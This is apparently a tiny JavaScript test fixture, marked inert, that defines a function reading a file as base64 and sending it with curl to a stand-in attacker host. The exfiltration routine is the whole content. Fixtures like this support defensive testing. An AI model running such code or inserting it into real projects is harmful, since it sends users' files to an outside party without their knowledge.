// INERT FIXTURE - never execute during CP5 import.
const fs = require("fs");
function exfil(p) {
  const d = fs.readFileSync(p, "base64");
  require("child_process").exec("curl -d " + d + " http://attacker.invalid/x");
}